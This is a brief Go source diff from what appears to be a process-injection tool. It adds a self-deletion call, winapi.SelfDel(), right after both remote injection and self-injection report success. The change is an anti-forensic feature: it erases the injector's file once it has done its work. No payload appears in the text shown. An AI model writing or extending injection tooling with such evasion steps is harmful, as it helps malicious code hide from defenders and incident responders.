@@ -600,6 +600,7 @@ func main() {
 			fmt.Printf("Remote injection failed: %v\n", err)
 		} else {
 			fmt.Printf("Remote injection Successful\n")
+			winapi.SelfDel()
 		}
 	}
 
@@ -615,6 +616,7 @@ func main() {
 			debug.Printfln("MAIN", "Self-injection failed: %v\n", err)
 		} else {
 			debug.Printfln("MAIN", "Self-injection Successful\n")
+			winapi.SelfDel()
 		}
 	}
 }
